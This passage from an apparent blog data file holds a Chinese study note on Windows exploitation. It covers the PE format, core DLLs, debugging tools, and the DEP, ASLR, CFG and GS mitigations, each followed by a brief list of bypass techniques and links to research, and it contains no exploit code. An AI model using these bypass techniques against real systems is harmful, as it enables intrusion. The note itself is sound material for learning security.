IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT       11 绑定输入表  \n#define IMAGE_DIRECTORY_ENTRY_IAT        12 导入地址表  \n#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13 延迟载入描述  \n#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR     14 COM信息  \n\n```\n用LoadPE等工具即可展示。\n<!--more-->\n#### Section Table\n\n在中是关于文件代码与数据的信息，类似与ELF格式中的节信息。\n\n#### Import Address Table(IAT)\n\n导入地址表，类似与ELF格式中的.plt.got表，用来将DLL动态链接到运行中的程序中去，DLL的实际内存地址被写在这个表中。注意是**只读**的。\n\n#### Export Address Table\n\n引出表类似与ELF格式中的ret2dl-resolve的利用方法中的.rel.dyn表，这个表中记录了导入dll中的一些函数名用来定位该函数。同样注意也是**只读**的。\n\n### 一些重要的DLL库\n\n#### ntdll.dll\n\n用户层与内核层的接口函数。\n这个库中提供了一些windows Naive(原生) API。\n驻留在写保护页中，进程间共享一个基址。\nntdll.dll是Windows系统从ring3到ring0的入口。位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中。\n\n#### kernel32.dll\n\n导入ntdll.dll文件，提供Windows API的接口。驻留在写保护页中，进程间共享一个基址。\n（所以猜测这个kernel32.dll和ntdll.dll都是系统启动时就加载在内存中了？待考证）\n\n#### mscrtxxx.dll\n\nMicrosoft C Runtime Library。类似于Glibc。功能也和Glibc一样，提供一些标准库。\n\n### Windows利用工具\n\n+ Cygwin\n+ [Pwintools（pwntools的一个简单实现）](https://www.xctf.org.cn/library/details/7ffeb1efce2a01e95f3d20cd9146179063305ee2/)\n+ Process Explorer\n+ VS Developer Command Prompt\n+ Windbg\n+ IDA\n+ OD/x64dbg\n\n### Window漏洞缓解技术\n\n#### 通用缓解技术\n\n+ DEP相当于linux下的NX\n+ ASLR\n+ CFG(Control Flow Guard)执行流保护\n\n![BlackHat2010](http://images2015.cnblogs.com/blog/928323/201604/928323-20160424163101913-972693786.png)\n\n#### DEP\n\n+ 相当于Linux中的NX\n\n+ Bypass\n\t+ ROP\n    + JIT Page, VirtualProtect etc\n    + Disable DEP for the process(NtSetInformationProcess)设置进程结构KPROCESS中相关标志位![设置相关标志位](http://images2015.cnblogs.com/blog/928323/201604/928323-20160424164039163-1082373018.png)\n\n#### ASLR\n\n+ 与Linux上的ASLR稍有不同\n\t+ PE映像基址每次系统启动时不同\n    + TEB/PEB/heap/stack每次进程启动时不同\n    + 同一个dll（某些，如ntdll.dll，kernel32.dll）的基址以第一次加载时固定，多个进程共享一个基址\n\n+ Bypass\n\t+ 地址信息泄露，可以通过pwn其他的进程\n    + brute-force (win7\tx64,\twin10\tx86)\n    + Attack Non-ASLR images or top down alloc(win7)\n    + 堆喷射/JIT\n    + [Modifying the BSTR length/null terminator & Modifying the Array object](https://www.fireeye.com/blog/threat-research/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html)\n\n#### [CFG](http://101.96.10.27/sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf)\n\n+ 所有的间接调用都会由一个事前定义的只读的bitmap来检查\n+ 攻击虚表将成为历史（ppt上这里暂时不理解，应该是说所有的虚表调用都是会由CFG检查）\n+ Bypass\n\t+ [Overwrite Guard CF Check Function Pointer](https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively.pdf)\n    + 覆写CFG未保护的地址（return address, SEH handler, etc.）\n    + 覆写CFG禁用模块\n    + [COOP++](http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf)\n\n### 基于栈的缓解技术\n\n+ GS\n+ SafeSEH\n+ SEHOP![GS](http://images2015.cnblogs.com/blog/928323/201604/928323-20160424150111601-1948331326.png)\n\n#### GS\n\n类似于Linux中的Canary\n\n+ Bypass\n\t+ corrupt SEH(x86)\n    + Stack\tunderflow向前溢出\n    + nonlinear\twrite不顺序写，单打返回地址\n    + emm...没看懂下面两个大佬写的是什么\n\n\n## 参考资料\n\n+ [WinPWN](https://blog.pwnhub.cn/download/01/WinPWN.pdf)\n+ [Windows平台下的漏洞利用与防护](http://www.cnblogs.com/flycat-2016/p/5426910.html)\n+ [Windows漏洞利用技术总结](http://www.cnblogs.com/Danny-Wei/p/3766337.html)\n+ [XMan笔记](https://www.xctf.org.cn/library/details/cbf49988610a48428addf58156ebed1434d162d5/)\n+ [Win10安全特性之执行流保护](http://www.freebuf.com/articles/security-management/58373.html)\n","source":"_posts/Windows-Exploit.md","raw":"---\ntitle: Windows Exploit\ntags:\n  - PWN\n  - Win\ncategories: []\ndate: 2017-08-15 23:01:45\n---\n\n## 基础知识\n\n### PE/COFF文件格式\n\n![思维导图](http://images2015.cnblogs.com/blog/928323/201604/928323-20160424150039054-1771063095.png)\n\n#### DOS header\n\n在中有一个MZ signature，事实上这个MZ signature是DOS文件的一个16bit的数字，表示这个DOS文件同样可以运行在MZ系统上（DOS的一个后续版本）\n\n#### PE FILE HEADER\n\n中有一个EntryPoint用来指示文件的入口点，同样的在ELF文件格式中也有这么一个东西来指示入口点。\nDATADirectory在`WINNT.H`中的定义如下\n```\n#define IMAGE_DIRECTORY_ENTRY_EXPORT         0 导出表  \n#define IMAGE_DIRECTORY_ENTRY_IMPORT         1 导入表   \n#define IMAGE_DIRECTORY_ENTRY_RESOURCE       2 资源目录  \n#define IMAGE_DIRECTORY_ENTRY_EXCEPTION      3 异常目录  \n#define IMAGE_DIRECTORY_ENTRY_SECURITY       4 安全目录  \n#define IMAGE_DIRECTORY_ENTRY_BASERELOC          5 重定位基本表  \n#define IMAGE_DIRECTORY_ENTRY_DEBUG      6 调试目录  \n#define IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7 描术字串  \n#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8 机器值  \n#define IMAGE_DIRECTORY_ENTRY_TLS        9 TLS目录  \n#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10 载入配值目录  \n#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT       11 绑定输入表  \n#define IMAGE_DIRECTORY_ENTRY_IAT        12 导入地址表  \n#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13 延迟载入描述  \n#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR     14 COM信息  \n\n```\n用LoadPE等工具即可展示。\n<!--more-->\n#### Section Table\n\n在中是关于文件代码与数据的信息，类似与ELF格式中的节信息。\n\n#### Import Address Table(IAT)\n\n导入地址表，类似与ELF格式中的.plt.got表，用来将DLL动态链接到运行中的程序中去，DLL的实际内存地址被写在这个表中。注意是**只读**的。\n\n#### Export Address Table\n\n引出表类似与ELF格式中的ret2dl-resolve的利用方法中的.rel.dyn表，这个表中记录了导入dll中的一些函数名用来定位该函数。同样注意也是**只读**的。\n\n### 一些重要的DLL库\n\n#### ntdll.dll\n\n用户层与内核层的接口函数。\n这个库中提供了一些windows Naive(原生) API。\n驻留在写保护页中，进程间共享一个基址。\nntdll.dll是Windows系统从ring3到ring0的入口。位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中。\n\n#### kernel32.dll\n\n导入ntdll.dll文件，提供Windows API的接口。驻留在写保护页中，进程间共享一个基址。\n（所以猜测这个kernel32.dll和ntdll.dll都是系统启动时就加载在内存中了？待考证）\n\n#### mscrtxxx.dll\n\nMicrosoft C Runtime Library。类似于Glibc。功能也和Glibc一样，提供一些标准库。\n\n### Windows利用工具\n\n+ Cygwin\n+ [Pwintools（pwntools的一个简单实现）](https://www.xctf.org.cn/library/details/7ffeb1efce2a01e95f3d20cd9146179063305ee2/)\n+ Process Explorer\n+ VS Developer Command Prompt\n+ Windbg\n+ IDA\n+ OD/x64dbg\n\n### Window漏洞缓解技术\n\n#### 通用缓解技术\n\n+ DEP相当于linux下的NX\n+ ASLR\n+ CFG(Control Flow Guard)执行流保护\n\n![BlackHat2010](http://images2015.cnblogs.com/blog/928323/201604/928323-20160424163101913-972693786.png)\n\n#### DEP\n\n+ 相当于Linux中的NX\n\n+ Bypass\n\t+ ROP\n    + JIT Page, VirtualProtect etc\n    + Disable DEP for the process(NtSetInformationProcess)设置进程结构KPROCESS中相关标志位![设置相关标志位](http://images2015.cnblogs.com/blog/928323/201604/928323-20160424164039163-1082373018.png)\n\n#### ASLR\n\n+ 与Linux上的ASLR稍有不同\n\t+ PE映像基址每次系统启动时不同\n    + TEB/PEB/heap/stack每次进程启动时不同\n    + 同一个dll（某些，如ntdll.dll，kernel32.dll）的基址以第一次加载时固定，多个进程共享一个基址\n\n+ Bypass\n\t+ 地址信息泄露，可以通过pwn其他的进程\n    + brute-force (win7\tx64,\twin10\tx86)\n    + Attack Non-ASLR images or top down alloc(win7)\n    + 堆喷射/JIT\n    + [Modifying the BSTR length/null terminator & Modifying the Array object](https://www.fireeye.com/blog/threat-research/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html)\n\n#### [CFG](http://101.96.10.27/sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf)\n\n+ 所有的间接调用都会由一个事前定义的只读的bitmap来检查\n+ 攻击虚表将成为历史（ppt上这里暂时不理解，应该是说所有的虚表调用都是会由CFG检查）\n+ Bypass\n\t+ [Overwrite Guard CF Check Function Pointer](https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively.pdf)\n    + 覆写CFG未保护的地址（return address, SEH handler, etc.）\n    + 覆写CFG禁用模块\n    + [COOP++](http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf)\n\n### 基于栈的缓解技术\n\n+ GS\n+ SafeSEH\n+ SEHOP![GS](http://images2015.cnblogs.com/blog/928323/201604/928323-20160424150111601-1948331326.png)\n\n#### GS\n\n类似于Linux中的Canary\n\n+ Bypass\n\t+ corrupt SEH(x86)\n    + Stack\tunderflow向前溢出\n    + nonlinear\twrite不顺序写，单打返回地址\n    + emm...没看懂下面两个大佬写的是什么\n\n\n## 参考资料\n\n+ [WinPWN](https://blog.pwnhub.cn/download/01/WinPWN.pdf)\n+ [Windows平台下的漏洞利用与防护](http://www.cnblogs.com/flycat-2016/p/5426910.html)\n+ [Windows漏洞利用技术总结](http://www.cnblogs.com/Danny-Wei/p/3766337.html)\n+ [XMan笔记](https://www.xctf.org.cn/library/details/cbf49988610a48428addf58156ebed1434d162d5/)\n+ [Win10安全特性之执行流保护](http://www.freebuf.com/articles/security-management/58373.html)\n","slug":"Windows-Exploit","published":1,"updated":"2017-08-16T09:20:21.837Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k2n003uhv184mpv7usf","content":"<h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><h3 id=\"PE-COFF文件格式\"><a href=\"#PE-COFF文件格式\" class=\"headerlink\" title=\"PE/COFF文件格式\"></a>PE/COFF文件格式</h3><p><img src=\"http://images2015.cnblogs.com/blog/928323/201604/928323-20160424150039054-1771063095.png\" alt=\"思维导图\"></p>\n<h4 id=\"DOS-header\"><a href=\"#DOS-header\" class=\"headerlink\" title=\"DOS header\"></a>DOS header</h4><p>在中有一个MZ signature，事实上这个MZ signature是DOS文件的一个16bit的数字，表示这个DOS文件同样可以运行在MZ系统上（DOS的一个后续版本）</p>\n<h4 id=\"PE-FILE-HEADER\"><a href=\"#PE-FILE-HEADER\" class=\"headerlink\" title=\"PE FILE HEADER\"></a>PE FILE HEADER</h4><p>中有一个EntryPoint用来指示文件的入口点，同样的在ELF文件格式中也有这么一个东西来指示入口点。<br>DATADirectory在<code>WINNT.H</code>中的定义如下<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT         0 导出表  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT         1 导入表   </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE       2 资源目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION      3 异常目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY       4 安全目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC          5 重定位基本表  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG      6 调试目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7 描术字串  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8 机器值  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_TLS        9 TLS目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10 载入配值目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT       11 绑定输入表  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_IAT        12 导入地址表  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13 延迟载入描述  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR     14 COM信息</span></div></pre></td></tr></table></figure></p>\n<p>用LoadPE等工具即可展示。<br><a id=\"more\"></a></p>\n<h4 id=\"Section-Table\"><a href=\"#Section-Table\" class=\"headerlink\" title=\"Section Table\"></a>Section Table</h4><p>在中是关于文件代码与数据的信息，类似与ELF格式中的节信息。</p>\n<h4 id=\"Import-Address-Table-IAT\"><a href=\"#Import-Address-Table-IAT\" class=\"headerlink\" title=\"Import Address Table(IAT)\"></a>Import Address Table(IAT)</h4><p>导入地址表，类似与ELF格式中的.plt.got表，用来将DLL动态链接到运行中的程序中去，DLL的实际内存地址被写在这个表中。注意是<strong>只读</strong>的。</p>\n<h4 id=\"Export-Address-Table\"><a href=\"#Export-Address-Table\" class=\"headerlink\" title=\"Export Address Table\"></a>Export Address Table</h4><p>引出表类似与ELF格式中的ret2dl-resolve的利用方法中的.rel.dyn表，这个表中记录了导入dll中的一些函数名用来定位该函数。同样注意也是<strong>只读</strong>的。</p>\n<h3 id=\"一些重要的DLL库\"><a href=\"#一些重要的DLL库\" class=\"headerlink\" title=\"一些重要的DLL库\"></a>一些重要的DLL库</h3><h4 id=\"ntdll-dll\"><a href=\"#ntdll-dll\" class=\"headerlink\" title=\"ntdll.dll\"></a>ntdll.dll</h4><p>用户层与内核层的接口函数。<br>这个库中提供了一些windows Naive(原生) API。<br>驻留在写保护页中，进程间共享一个基址。<br>ntdll.dll是Windows系统从ring3到ring0的入口。位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中。</p>\n<h4 id=\"kernel32-dll\"><a href=\"#kernel32-dll\" class=\"headerlink\" title=\"kernel32.dll\"></a>kernel32.dll</h4><p>导入ntdll.dll文件，提供Windows API的接口。驻留在写保护页中，进程间共享一个基址。<br>（所以猜测这个kernel32.dll和ntdll.dll都是系统启动时就加载在内存中了？待考证）</p>\n<h4 id=\"mscrtxxx-dll\"><a href=\"#mscrtxxx-dll\" class=\"headerlink\" title=\"mscrtxxx.dll\"></a>mscrtxxx.dll</h4><p>Microsoft C Runtime Library。类似于Glibc。功能也和Glibc一样，提供一些标准库。</p>\n<h3 id=\"Windows利用工具\"><a href=\"#Windows利用工具\" class=\"headerlink\" title=\"Windows利用工具\"></a>Windows利用工具</h3><ul>\n<li>Cygwin</li>\n<li><a href=\"https://www.xctf.org.cn/library/details/7ffeb1efce2a01e95f3d20cd9146179063305ee2/\" target=\"_blank\" rel=\"external\">Pwintools（pwntools的一个简单实现）</a></li>\n<li>Process Explorer</li>\n<li>VS Developer Command Prompt</li>\n<li>Windbg</li>\n<li>IDA</li>\n<li>OD/x64dbg</li>\n</ul>\n<h3 id=\"Window漏洞缓解技术\"><a href=\"#Window漏洞缓解技术\" class=\"headerlink\" title=\"Window漏洞缓解技术\"></a>Window漏洞缓解技术</h3><h4 id=\"通用缓解技术\"><a href=\"#通用缓解技术\" class=\"headerlink\" title=\"通用缓解技术\"></a>通用缓解技术</h4><ul>\n<li>DEP相当于linux下的NX</li>\n<li>ASLR</li>\n<li>CFG(Control Flow Guard)执行流保护</li>\n</ul>\n<p><img src=\"http://images2015.cnblogs.com/blog/928323/201604/928323-20160424163101913-972693786.png\" alt=\"BlackHat2010\"></p>\n<h4 id=\"DEP\"><a href=\"#DEP\" class=\"headerlink\" title=\"DEP\"></a>DEP</h4><ul>\n<li><p>相当于Linux中的NX</p>\n</li>\n<li><p>Bypass</p>\n<ul>\n<li>ROP</li>\n<li>JIT Page, VirtualProtect etc</li>\n<li>Disable DEP for the process(NtSetInformationProcess)设置进程结构KPROCESS中相关标志位<img src=\"http://images2015.cnblogs.com/blog/928323/201604/928323-20160424164039163-1082373018.png\" alt=\"设置相关标志位\"></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"ASLR\"><a href=\"#ASLR\" class=\"headerlink\" title=\"ASLR\"></a>ASLR</h4><ul>\n<li><p>与Linux上的ASLR稍有不同</p>\n<ul>\n<li>PE映像基址每次系统启动时不同</li>\n<li>TEB/PEB/heap/stack每次进程启动时不同</li>\n<li>同一个dll（某些，如ntdll.dll，kernel32.dll）的基址以第一次加载时固定，多个进程共享一个基址</li>\n</ul>\n</li>\n<li><p>Bypass</p>\n<ul>\n<li>地址信息泄露，可以通过pwn其他的进程</li>\n<li>brute-force (win7    x64,    win10    x86)</li>\n<li>Attack Non-ASLR images or top down alloc(win7)</li>\n<li>堆喷射/JIT</li>\n<li><a href=\"https://www.fireeye.com/blog/threat-research/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html\" target=\"_blank\" rel=\"external\">Modifying the BSTR length/null terminator &amp; Modifying the Array object</a></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"CFG\"><a href=\"#CFG\" class=\"headerlink\" title=\"CFG\"></a><a href=\"http://101.96.10.27/sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf\" target=\"_blank\" rel=\"external\">CFG</a></h4><ul>\n<li>所有的间接调用都会由一个事前定义的只读的bitmap来检查</li>\n<li>攻击虚表将成为历史（ppt上这里暂时不理解，应该是说所有的虚表调用都是会由CFG检查）</li>\n<li>Bypass<ul>\n<li><a href=\"https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively.pdf\" target=\"_blank\" rel=\"external\">Overwrite Guard CF Check Function Pointer</a></li>\n<li>覆写CFG未保护的地址（return address, SEH handler, etc.）</li>\n<li>覆写CFG禁用模块</li>\n<li><a href=\"http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf\" target=\"_blank\" rel=\"external\">COOP++</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"基于栈的缓解技术\"><a href=\"#基于栈的缓解技术\" class=\"headerlink\" title=\"基于栈的缓解技术\"></a>基于栈的缓解技术</h3><ul>\n<li>GS</li>\n<li>SafeSEH</li>\n<li>SEHOP<img src=\"http://images2015.cnblogs.com/blog/928323/201604/928323-20160424150111601-1948331326.png\" alt=\"GS\"></li>\n</ul>\n<h4 id=\"GS\"><a href=\"#GS\" class=\"headerlink\" title=\"GS\"></a>GS</h4><p>类似于Linux中的Canary</p>\n<ul>\n<li>Bypass<ul>\n<li>corrupt SEH(x86)</li>\n<li>Stack    underflow向前溢出</li>\n<li>nonlinear    write不顺序写，单打返回地址</li>\n<li>emm…没看懂下面两个大佬写的是什么</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://blog.pwnhub.cn/download/01/WinPWN.pdf\" target=\"_blank\" rel=\"external\">WinPWN</a></li>\n<li><a href=\"http://www.cnblogs.com/flycat-2016/p/5426910.html\" target=\"_blank\" rel=\"external\">Windows平台下的漏洞利用与防护</a></li>\n<li><a href=\"http://www.cnblogs.com/Danny-Wei/p/3766337.html\" target=\"_blank\" rel=\"external\">Windows漏洞利用技术总结</a></li>\n<li><a href=\"https://www.xctf.org.cn/library/details/cbf49988610a48428addf58156ebed1434d162d5/\" target=\"_blank\" rel=\"external\">XMan笔记</a></li>\n<li><a href=\"http://www.freebuf.com/articles/security-management/58373.html\" target=\"_blank\" rel=\"external\">Win10安全特性之执行流保护</a></li>\n</ul>\n","excerpt":"<h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><h3 id=\"PE-COFF文件格式\"><a href=\"#PE-COFF文件格式\" class=\"headerlink\" title=\"PE/COFF文件格式\"></a>PE/COFF文件格式</h3><p><img src=\"http://images2015.cnblogs.com/blog/928323/201604/928323-20160424150039054-1771063095.png\" alt=\"思维导图\"></p>\n<h4 id=\"DOS-header\"><a href=\"#DOS-header\" class=\"headerlink\" title=\"DOS header\"></a>DOS header</h4><p>在中有一个MZ signature，事实上这个MZ signature是DOS文件的一个16bit的数字，表示这个DOS文件同样可以运行在MZ系统上（DOS的一个后续版本）</p>\n<h4 id=\"PE-FILE-HEADER\"><a href=\"#PE-FILE-HEADER\" class=\"headerlink\" title=\"PE FILE HEADER\"></a>PE FILE HEADER</h4><p>中有一个EntryPoint用来指示文件的入口点，同样的在ELF文件格式中也有这么一个东西来指示入口点。<br>DATADirectory在<code>WINNT.H</code>中的定义如下<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT         0 导出表  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT         1 导入表   </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE       2 资源目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION      3 异常目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY       4 安全目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC          5 重定位基本表  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG      6 调试目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7 描术字串  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8 机器值  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_TLS        9 TLS目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10 载入配值目录  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT       11 绑定输入表  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_IAT        12 导入地址表  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13 延迟载入描述  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR     14 COM信息</span></div></pre></td></tr></table></figure></p>\n<p>用LoadPE等工具即可展示。<br></p>","more":"<p></p>\n<h4 id=\"Section-Table\"><a href=\"#Section-Table\" class=\"headerlink\" title=\"Section Table\"></a>Section Table</h4><p>在中是关于文件代码与数据的信息，类似与ELF格式中的节信息。</p>\n<h4 id=\"Import-Address-Table-IAT\"><a href=\"#Import-Address-Table-IAT\" class=\"headerlink\" title=\"Import Address Table(IAT)\"></a>Import Address Table(IAT)</h4><p>导入地址表，类似与ELF格式中的.plt.got表，用来将DLL动态链接到运行中的程序中去，DLL的实际内存地址被写在这个表中。注意是<strong>只读</strong>的。</p>\n<h4 id=\"Export-Address-Table\"><a href=\"#Export-Address-Table\" class=\"headerlink\" title=\"Export Address Table\"></a>Export Address Table</h4><p>引出表类似与ELF格式中的ret2dl-resolve的利用方法中的.rel.dyn表，这个表中记录了导入dll中的一些函数名用来定位该函数。同样注意也是<strong>只读</strong>的。</p>\n<h3 id=\"一些重要的DLL库\"><a href=\"#一些重要的DLL库\" class=\"headerlink\" title=\"一些重要的DLL库\"></a>一些重要的DLL库</h3><h4 id=\"ntdll-dll\"><a href=\"#ntdll-dll\" class=\"headerlink\" title=\"ntdll.dll\"></a>ntdll.dll</h4><p>用户层与内核层的接口函数。<br>这个库中提供了一些windows Naive(原生) API。<br>驻留在写保护页中，进程间共享一个基址。<br>ntdll.dll是Windows系统从ring3到ring0的入口。位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中。</p>\n<h4 id=\"kernel32-dll\"><a href=\"#kernel32-dll\" class=\"headerlink\" title=\"kernel32.dll\"></a>kernel32.dll</h4><p>导入ntdll.dll文件，提供Windows API的接口。驻留在写保护页中，进程间共享一个基址。<br>（所以猜测这个kernel32.dll和ntdll.dll都是系统启动时就加载在内存中了？待考证）</p>\n<h4 id=\"mscrtxxx-dll\"><a href=\"#mscrtxxx-dll\" class=\"headerlink\" title=\"mscrtxxx.dll\"></a>mscrtxxx.dll</h4><p>Microsoft C Runtime Library。类似于Glibc。功能也和Glibc一样，提供一些标准库。</p>\n<h3 id=\"Windows利用工具\"><a href=\"#Windows利用工具\" class=\"headerlink\" title=\"Windows利用工具\"></a>Windows利用工具</h3><ul>\n<li>Cygwin</li>\n<li><a href=\"https://www.xctf.org.cn/library/details/7ffeb1efce2a01e95f3d20cd9146179063305ee2/\">Pwintools（pwntools的一个简单实现）</a></li>\n<li>Process Explorer</li>\n<li>VS Developer Command Prompt</li>\n<li>Windbg</li>\n<li>IDA</li>\n<li>OD/x64dbg</li>\n</ul>\n<h3 id=\"Window漏洞缓解技术\"><a href=\"#Window漏洞缓解技术\" class=\"headerlink\" title=\"Window漏洞缓解技术\"></a>Window漏洞缓解技术</h3><h4 id=\"通用缓解技术\"><a href=\"#通用缓解技术\" class=\"headerlink\" title=\"通用缓解技术\"></a>通用缓解技术</h4><ul>\n<li>DEP相当于linux下的NX</li>\n<li>ASLR</li>\n<li>CFG(Control Flow Guard)执行流保护</li>\n</ul>\n<p><img src=\"http://images2015.cnblogs.com/blog/928323/201604/928323-20160424163101913-972693786.png\" alt=\"BlackHat2010\"></p>\n<h4 id=\"DEP\"><a href=\"#DEP\" class=\"headerlink\" title=\"DEP\"></a>DEP</h4><ul>\n<li><p>相当于Linux中的NX</p>\n</li>\n<li><p>Bypass</p>\n<ul>\n<li>ROP</li>\n<li>JIT Page, VirtualProtect etc</li>\n<li>Disable DEP for the process(NtSetInformationProcess)设置进程结构KPROCESS中相关标志位<img src=\"http://images2015.cnblogs.com/blog/928323/201604/928323-20160424164039163-1082373018.png\" alt=\"设置相关标志位\"></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"ASLR\"><a href=\"#ASLR\" class=\"headerlink\" 